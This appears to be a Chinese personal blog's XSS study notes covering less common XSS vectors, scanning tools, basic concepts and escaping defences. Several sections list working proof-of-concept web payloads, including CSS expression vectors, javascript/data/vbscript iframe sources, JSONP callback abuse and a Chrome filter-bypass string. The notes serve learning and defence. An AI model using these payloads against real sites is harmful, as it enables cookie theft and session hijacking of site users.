<li>标签一般是看加载后的HTML页面 / 属性值一般是看加载后属性中的值</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/XSS--%E5%85%B6%E4%BB%96XSS%E6%80%9D%E8%B7%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/02/XSS--%E5%85%B6%E4%BB%96XSS%E6%80%9D%E8%B7%AF/" itemprop="url">XSS--其他XSS思路</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:01:27+08:00">
                2020-04-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/XSS/" itemprop="url" rel="index">
                    <span itemprop="name">XSS</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.7k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  7 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-其他XSS思路"><a href="#1-其他XSS思路" class="headerlink" title="1. 其他XSS思路"></a>1. 其他XSS思路</h4><ul>
<li>▲ 本节部分来自bmjoker大佬的博客内容：<a href="https://www.cnblogs.com/bmjoker/p/8805395.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/8805395.html</a> 有一部分来自ahao2333大佬的博客内容：<a href="https://www.cnblogs.com/xiaomeng2333/p/11595786.html，" target="_blank" rel="noopener">https://www.cnblogs.com/xiaomeng2333/p/11595786.html，</a> 也有部分来自心伤的瘦子@乌云</li>
</ul>
<h4 id="2-第三方劫持-外调J-C"><a href="#2-第三方劫持-外调J-C" class="headerlink" title="2. 第三方劫持 (外调J/C)"></a>2. 第三方劫持 (外调J/C)</h4><ul>
<li>第三方劫持就是把资源域的服务器的权限拿下，替换相关资源，采用’迂回式’的渗透方式</li>
<li>名字里的”外调”不是从目标网站上插入新的J/C。而是在目标网站上找到不是本站的J/C，然后渗透那个网站，重写J/C，来达到渗透目标网站</li>
<li>外调：javascript、css、flash、etc、html、SWF</li>
<li>来自”长短短”的代码，获取非本站的J/C</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for(var i=0,tags=document.querySelectorAll(&apos;iframe[src],frame[src],script[src],link[rel=stylesheet],object[data],embed[src]&apos;),tag;tag=tags[i];i++)&#123;</span><br><span class="line">  var a = document.createElement(&apos;a&apos;);</span><br><span class="line">  a.href = tag.src||tag.href||tag.data;</span><br><span class="line">  if(a.hostname!=location.hostname)&#123;</span><br><span class="line">    console.warn(location.hostname+&apos; 发现第三方资源[&apos;+tag.localName+&apos;]:&apos;+a.href);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-XSS-downloader"><a href="#3-XSS-downloader" class="headerlink" title="3. XSS downloader"></a>3. XSS downloader</h4><ul>
<li>把反射和储蓄结合起来，把核心代码写在网站上，然后以XSS触发并调用代码，实现攻击</li>
<li>▲ 《XSS跨转脚本攻击剖析与防御》一书中有</li>
<li>▲ 2020.03.29 看的一知半解，日后再理解</li>
</ul>
<h4 id="4-XCS"><a href="#4-XCS" class="headerlink" title="4. XCS"></a>4. XCS</h4><ul>
<li>XCS就是利用浏览器来玩XSS，它的功能比普通上的XSS还要强大，因为利用浏览器协议漏洞，可以调用浏览器的API来实现下载覆盖本地文件(可以把它这个功能理解为挂马)</li>
<li>XSC还可以控制浏览器的历史、设置、收藏夹等</li>
</ul>
<h4 id="5-页面渲染XSS"><a href="#5-页面渲染XSS" class="headerlink" title="5. 页面渲染XSS"></a>5. 页面渲染XSS</h4><ul>
<li>jpg(ie6下才会出现)、word里写xss vector的，各种邮箱、网盘等</li>
<li>假如我当前页面存在txt文件，而txt文件内容为<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>时，就会弹窗。因为浏览器把txt的内容当成html来输出了</li>
<li>▲ 若站点可以上传txt，且浏览器版本低，此漏洞危害很大</li>
</ul>
<h4 id="6-XSF-Flash-XSS"><a href="#6-XSF-Flash-XSS" class="headerlink" title="6. XSF(Flash XSS)"></a>6. XSF(Flash XSS)</h4><ul>
<li>XSF其实不算XSS的分类中，应该算作XSS的分支，因为在XSS使用到的技巧，在XSF只有一部分可以使用，因为XSF是基于ActionScript2/3.0语言的基础上</li>
<li>在ActionScript2/3.0里以下几个函数需要重点关注下：getURL、navigateToURL、ExternalInterface.call、ExternalInterface.call、htmlText、addcallback等</li>
<li>▲ 关乎XSF的，wooyun.tenclent中有大量的例子在云服务器上</li>
</ul>
<h4 id="7-XST（Cross-Site-Tracing）"><a href="#7-XST（Cross-Site-Tracing）" class="headerlink" title="7. XST（Cross-Site Tracing）"></a>7. XST（Cross-Site Tracing）</h4><ul>
<li>跨站追踪，指利用JavaScript发送HTTP的TRACE方法来窃取Cookie值或Basic认证密码的攻击手段</li>
<li>实际上，现在的主流浏览器都已经能够自己防御XST</li>
</ul>
<h4 id="8-CSSXSS"><a href="#8-CSSXSS" class="headerlink" title="8. CSSXSS"></a>8. CSSXSS</h4><ul>
<li>css代码中利用expression触发xss漏洞<ul>
<li><code>&lt;div style=&quot;width: expression(alert(&#39;xss&#39;));&gt;</code></li>
<li><code>&lt;style&gt;body {background-image:expression(alert(&quot;xss&quot;));}&lt;/style&gt;</code></li>
<li><code>&lt;div style=&quot;list-style-image:url(javascript:alert(&#39;xss&#39;))&quot;&gt;</code></li>
</ul>
</li>
<li>css代码中利用@import触发xss<ul>
<li><code>&lt;stytle&gt;@import &#39;javascript:alert(&quot;XSS&quot;)&#39;;&lt;/stytle&gt;</code></li>
</ul>
</li>
<li>css代码中使用@import和link方式导入外部含有xss代码的样式表文件<ul>
<li><code>&lt;link rel=&quot;stytlesheet&quot; href=&quot;http://www.***.com/a.css&quot;&gt;</code></li>
<li><code>&lt;stytle type=&#39;text/css&#39;&gt;@import url(http://www.*.com/a.css);&lt;/style&gt;</code></li>
</ul>
</li>
<li>▲ xss过滤函数需过滤style标签、style属性、expression、javascript、import等关键字，但实际上，CSSXSS在近几年较少</li>
<li>▲ IE8的标准中就禁用了expression功能执行JavaScript，但在其他模式中还可以使用</li>
</ul>
<h4 id="9-针对HTTP头的思路（一般为PHP语言）"><a href="#9-针对HTTP头的思路（一般为PHP语言）" class="headerlink" title="9. 针对HTTP头的思路（一般为PHP语言）"></a>9. 针对HTTP头的思路（一般为PHP语言）</h4><ul>
<li>使用Cookie来作为显示参数的值</li>
<li>使用Referer来作为显示参数的值</li>
<li>使用User-Agent来作为显示参数的值</li>
<li>记录IP地址<ul>
<li>HTTP_X_FORWARDED-FOR() -&gt; 可伪造 -&gt; 火狐插件X-Forwarded-For Header</li>
<li>HTTP_CLIENT_IP() -&gt; 可伪造 -&gt; 火狐插件Modify Headers</li>
<li>REMOTE_ADDR() -&gt; 不可伪造</li>
</ul>
</li>
</ul>
<h4 id="10-针对DOM中iframe的思路（-路径可控-问题，iframe中的输出可以控制）"><a href="#10-针对DOM中iframe的思路（-路径可控-问题，iframe中的输出可以控制）" class="headerlink" title="10. 针对DOM中iframe的思路（[路径可控]问题，iframe中的输出可以控制）"></a>10. 针对DOM中iframe的思路（[路径可控]问题，iframe中的输出可以控制）</h4><ul>
<li>▲ 针对不同浏览器，要过滤不同的协议<ul>
<li>chrome -&gt; data协议</li>
<li>IE -&gt; vbscript协议（vbscript里 ‘单引号表示注释，类似JS里的//）</li>
<li>通用 -&gt; javascript协议</li>
</ul>
</li>
<li>onload执行js：<code>&lt;iframe onload=&quot;alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
<li>src 执行javascript代码：<code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
<li>IE下vbscript执行代码：<code>&lt;iframe src=&quot;vbscript:msgbox(1)&quot;&gt;&lt;/iframe&gt;</code></li>
<li>Chrome下data协议执行代码：<code>&lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt; Chrome</code></li>
<li>上面的变体：<code>&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></li>
<li>Chrome下srcdoc属性：<code>&lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></li>
</ul>
<h4 id="11-针对JSONP中地址的可控（callback参数的限制以及自定义参数）"><a href="#11-针对JSONP中地址的可控（callback参数的限制以及自定义参数）" class="headerlink" title="11. 针对JSONP中地址的可控（callback参数的限制以及自定义参数）"></a>11. 针对JSONP中地址的可控（callback参数的限制以及自定义参数）</h4><ul>
<li>一些程序员会动态的加载json数据，同域的时候，可以使用ajax</li>
<li>有时候，数据所在域和当前页面所在域又不一致，跨域请求数据的手段中，有种叫做jsonp</li>
<li>代码表示：<code>somescript.src=&quot;http://otherdomain.com/xx?jsonp=callback&quot;</code></li>
<li>可控参数：<code>somescript.src=&quot;http://otherdomain.com/xx?jsonp=callback&amp;id=&quot;+id;</code></li>
<li>地址的可控<ul>
<li>script src=”完全可控” ,这种就简单了，直接将地址换为我们的JS地址</li>
<li>script src=”/path/xxx/[路径可控]/1.js”<ul>
<li>可以直接上传文本至同域名下，不一定要是HTML文件，需要上传点有过滤缺陷。</li>
<li>参数可控，利用可用的json接口（script src=”/path/xxx/…/yyy/xx.json?callback=alert(1)”）</li>
</ul>
</li>
<li>script src=”/xxxx/json.php?callback=xxxx&amp;param1=yyy&amp;param2=[参数可控]”情况与地址可控的第二点参数可控类似</li>
</ul>
</li>
</ul>
<h4 id="12-针对浏览器的过滤器（chrome）"><a href="#12-针对浏览器的过滤器（chrome）" class="headerlink" title="12. 针对浏览器的过滤器（chrome）"></a>12. 针对浏览器的过滤器（chrome）</h4><ul>
<li>查看是否被浏览器拦截 -&gt; chrome<ul>
<li>Refused to execute a javascript script.Source code of script found within request</li>
<li>查看源码 -&gt; 是否被和谐</li>
</ul>
</li>
<li>绕过通用方法<ul>
<li>要求<ul>
<li>缺陷点允许&lt;&gt; </li>
<li>缺陷点运行=</li>
<li>缺陷点的后方存在<code>&lt;/script&gt;</code>标签</li>
</ul>
</li>
</ul>
</li>
<li>构造payload：<code>&lt;script src=data:,alert(1)&lt;!--</code></li>
<li>▲ 一般过滤器的规则，是觉得是恶意代码的才会去拦截，可以利用代码，去绕过规则</li>
<li>▲ IE等其他浏览器的过滤器暂无找到资料</li>
</ul>
<h4 id="13-富文本操作"><a href="#13-富文本操作" class="headerlink" title="13. 富文本操作"></a>13. 富文本操作</h4><ul>
<li>白名单，即：只允许使用白名单内的合法HTML标签，例如IMG，其它均剔除</li>
<li>黑名单，即：厂商会构建一个有危害的HTML标签、属性列表，然后通过分析用户提交的HTML代码，剔除其中有害的部分</li>
<li>▲ 白名单要安全得多，而黑名单的方式则经常会被绕过</li>
<li>▲ 当所有的思路走不通时，可以用富文本，大量的payload去碰撞，用bp进行抓包修改</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/XSS--%E5%B7%A5%E5%85%B7%E6%8C%96%E6%8E%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/02/XSS--%E5%B7%A5%E5%85%B7%E6%8C%96%E6%8E%98/" itemprop="url">XSS--工具挖掘</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:01:27+08:00">
                2020-04-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/XSS/" itemprop="url" rel="index">
                    <span itemprop="name">XSS</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  221 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-火狐中常见的XSS插件"><a href="#1-火狐中常见的XSS插件" class="headerlink" title="1. 火狐中常见的XSS插件"></a>1. 火狐中常见的XSS插件</h4><ul>
<li>OWASP Mantra - Security Framework<ul>
<li>OWASP出品的类同火狐浏览器</li>
</ul>
</li>
<li>Hackbar<ul>
<li>构造http包，一个常用的神器</li>
</ul>
</li>
<li>Firebug<ul>
<li>查看源代码</li>
</ul>
</li>
<li>Tamper Popup<ul>
<li>抓包</li>
<li>clinet-ip</li>
<li>▲ 若服务器接收客户端IP并显示，可能存在XSS漏洞</li>
</ul>
</li>
<li>Live HTTP headers<ul>
<li>修改抓包的数据</li>
</ul>
</li>
<li>Editor Cookie<ul>
<li>编辑Cookie信息</li>
</ul>
</li>
<li>Cookie Manage<ul>
<li>Cookie信息的管理者</li>
</ul>
</li>
</ul>
<h4 id="2-XSS漏洞工具挖掘"><a href="#2-XSS漏洞工具挖掘" class="headerlink" title="2. XSS漏洞工具挖掘"></a>2. XSS漏洞工具挖掘</h4><ul>
<li>⭐ 尽量不要尝试POST型的闭合，可能导致页面扭曲歪曲，特别是存储型XSS</li>
<li>avws</li>
<li>netspark</li>
<li>appscan</li>
<li>burp</li>
<li>xsser</li>
<li>xsscrapy</li>
<li>brutexssr<ul>
<li>python脚本编写，命令行执行</li>
<li>get/post请求方式，通过wordlist去尝试</li>
</ul>
</li>
<li>OWASP Xenotix XSS Exploit Framework<ul>
<li>setting -&gt; start（xook.js中存放有几千条xss代码）</li>
<li>Scanner -&gt; GET -&gt; 粘贴地址 -&gt; 字段加入[x] -&gt; Fuzz</li>
<li>Scanner -&gt; POST -&gt; Burpsuite抓包黏贴Request Header -&gt; 指定字段 -&gt; Fuzz</li>
</ul>
</li>
<li>▲ 工具的使用暂不介绍</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/XSS--%E6%A6%82%E8%A6%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/02/XSS--%E6%A6%82%E8%A6%81/" itemprop="url">XSS--概要</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:01:27+08:00">
                2020-04-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/XSS/" itemprop="url" rel="index">
                    <span itemprop="name">XSS</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  821 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-XSS漏洞的基础详解"><a href="#1-XSS漏洞的基础详解" class="headerlink" title="1. XSS漏洞的基础详解"></a>1. XSS漏洞的基础详解</h4><ul>
<li>由于web应用程序对用户的输入过滤不严而产生的</li>
<li>攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采用cookie资料窃取，会话劫持，钓鱼欺骗等攻击手段</li>
<li>漏洞形成根源<ul>
<li>服务器对用户提交数据过滤不严</li>
<li>提交给服务器的脚本被直接返回给其他客户端执行</li>
<li>脚本在客户端执行恶意操作</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;xss test&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">//使用xss弹出恶意警告框，代码为</span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">//xss输入也可能时html代码段，如果使网页不停的刷新，代码为</span><br><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0&quot;;&gt;</span><br><span class="line">//嵌入其他网站链接的代码</span><br><span class="line">&lt;iframe src=http://cracer.com width=0 height=0&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<h4 id="2-XSS的危害"><a href="#2-XSS的危害" class="headerlink" title="2. XSS的危害"></a>2. XSS的危害</h4><ul>
<li>网络钓鱼，包括盗取各类的用户账号 -&gt; （反射型/存储型XSS）</li>
<li>窃取用户cookie -&gt; 钓鱼（反射型/存储型XSS）</li>
<li>窃取用户浏览会话 -&gt; （反射型/存储型XSS）</li>
<li>强制弹出广告页面、刷流量 -&gt; 存储型XSS</li>
<li>网页挂马提升用户权限，进一步渗透网站</li>
<li>传播跨站脚本蠕虫等 -&gt; 存储型XSS</li>
<li>点击劫持 -&gt; 通过script标签+iframe调用存在xss的页面+css样式实现</li>
<li>篡改网页 -&gt; form元素的action属性被改为恶意网站的URL，然后进行攻</li>
<li>通过JavaScript攻击 -&gt; 随着Ajax技术的风靡，通过JavaScript调用Web应用的各种功能的程序（API）</li>
<li>▲ 危害一般性：存储型&gt;反射型&gt;DOM型</li>
</ul>
<h4 id="3-存在XSS的地方"><a href="#3-存在XSS的地方" class="headerlink" title="3. 存在XSS的地方"></a>3. 存在XSS的地方</h4><ul>
<li>个人资料（昵称、签名、说明、邮箱、微信、qq、支付宝、银行卡）</li>
<li>查询接口</li>
<li>留言板</li>
<li>url</li>
<li>文件上传</li>
<li>flash</li>
<li>http头（referer、cookie、user-agent、client-ip）</li>
<li>swf</li>
</ul>
<h4 id="4-反射型XSS"><a href="#4-反射型XSS" class="headerlink" title="4. 反射型XSS"></a>4. 反射型XSS</h4><ul>
<li>反射型跨站脚本也称作非持久型、参数型跨站脚本，这类型的脚本是最常见的，也是使用最为广泛的一种，主要用于将恶意的脚本附加到URL地址的参数中</li>
<li>▲ 一般使用的将构造好的URL发给受害者，使受害者点击触发，而且只执行一次，非持久化</li>
</ul>
<p><img src="/images/xss/Web_Security/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%B5%81%E7%A8%8B.png" alt="反射型XSS流程"></p>
<h4 id="5-存储型XSS"><a href="#5-存储型XSS" class="headerlink" title="5. 存储型XSS"></a>5. 存储型XSS</h4><ul>
<li>存储型XSS比反射型跨站脚本更具威胁性，并且可能影响倒web服务器的自身安全</li>
<li>此类XSS不需要用户点击特定的URL就能执行跨站脚本，攻击者事先将恶意javascript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意的代码的页面就会执行恶意代码</li>
</ul>
<p><img src="/images/xss/Web_Security/%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%B5%81%E7%A8%8B.png" alt="存储型XSS流程"></p>
<h4 id="6-DOM型XSS"><a href="#6-DOM型XSS" class="headerlink" title="6. DOM型XSS"></a>6. DOM型XSS</h4><ul>
<li>本质是反射型，利用浏览器DOM特性，直接在本地执行修改</li>
<li>▲ 此类漏洞难以挖掘</li>
<li>▲ 关乎DOM型的问题，可以看云服务器上一篇关乎DOM-XSS的介绍</li>
</ul>
<h4 id="7-若再深入研究XSS"><a href="#7-若再深入研究XSS" class="headerlink" title="7. 若再深入研究XSS"></a>7. 若再深入研究XSS</h4><ul>
<li>DOM型XSS的挖掘与使用</li>
<li>CSP策略及绕过方法</li>
<li>跨域访问与跨域资源共享</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/XSS--%E9%98%B2%E6%8A%A4%E7%AD%96%E7%95%A5%E4%B8%8E%E4%BB%A3%E7%A0%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/02/XSS--%E9%98%B2%E6%8A%A4%E7%AD%96%E7%95%A5%E4%B8%8E%E4%BB%A3%E7%A0%81/" itemprop="url">XSS--防护策略与代码</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:01:27+08:00">
                2020-04-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/XSS/" itemprop="url" rel="index">
                    <span itemprop="name">XSS</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  2k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  8 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-常见的防XSS对策"><a href="#1-常见的防XSS对策" class="headerlink" title="1. 常见的防XSS对策"></a>1. 常见的防XSS对策</h4><ul>
<li>参数所在位置及相应的转义方法</li>
</ul>
<table>
<thead>
<tr>
<th align="center">位置</th>
<th align="center">说明</th>
<th align="center">最低限度的转义内容</th>
</tr>
</thead>
<tbody><tr>
<td align="center">元素内容</td>
<td align="center">能解释Tag和字符实体</br>结束边界符为”&lt;”</td>
<td align="center">“&lt;”和”&amp;”使用字符实体转义</td>
</tr>
<tr>
<td align="center">属性值（双引号中的内容）</td>
<td align="center">能解释字符实体</br>结束边界符为双引号</td>
<td align="center">属性值使用双引号括起来，”&lt;”和”&amp;”和”””使用字符实体转义</td>
</tr>
<tr>
<td align="center">属性值（URL）</td>
<td align="center">同上</td>
<td align="center">检测URL格式正确后按照属性值的规则转义</td>
</tr>
<tr>
<td align="center">事件绑定函数</td>
<td align="center">同上</td>
<td align="center">转义JavaScript后按照属性值得规则转义</td>
</tr>
<tr>
<td align="center">script元素中的字符串字面量</td>
<td align="center">不能解释Tag和字符实体</br>结束边界符为”&lt;”</td>
<td align="center">转义JavaScript应避免出现”&lt;/“</td>
</tr>
</tbody></table>
<ul>
<li>htmlspecialchars()函数</li>
</ul>
<table>
<thead>
<tr>
<th align="center">转换前</th>
<th align="center">转换后</th>
<th align="center">ENT_NOQUOTES</th>
<th align="center">ENT_COMPAT</th>
<th align="center">ENT_QUOTES</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&lt;</td>
<td align="center"><code>&amp;lt;</code></td>
<td align="center">√</td>
<td align="center">√</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">&gt;</td>
<td align="center"><code>&amp;gt;</code></td>
<td align="center">√</td>
<td align="center">√</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">&amp;</td>
<td align="center"><code>&amp;amp;</code></td>
<td align="center">√</td>
<td align="center">√</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">“</td>
<td align="center"><code>&amp;quot;</code></td>
<td align="center">×</td>
<td align="center">√</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">‘</td>
<td align="center"><code>&amp;#39;</code></td>
<td align="center">×</td>
<td align="center">×</td>
<td align="center">√</td>
</tr>
</tbody></table>
<ul>
<li>JavaScript字符串字面量应被转义的字符</li>
</ul>
<table>
<thead>
<tr>
<th align="center">字符</th>
<th align="center">转义后</th>
</tr>
</thead>
<tbody><tr>
<td align="center">|\</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">‘</td>
<td align="center">&#39;</td>
</tr>
<tr>
<td align="center">“</td>
<td align="center">&quot;</td>
</tr>
<tr>
<td align="center">换行</td>
<td align="center">\n</td>
</tr>
</tbody></table>
<ul>
<li>指定响应的字符编码<ul>
<li>如果Web应用与浏览器各自设想的字符编码不一致，也会成为XSS的原因</li>
<li>header(‘Content-Type: text/html; charset=UTF-8’);</li>
</ul>
</li>
<li>输入校验<ul>
<li>通过检验输入值的有效性，当输入不符合条件时就显示错误消息并促使用户重新输入，有时也能够防御XSS攻击</li>
</ul>
</li>
<li>给Cookie添加HttpOnly属性<ul>
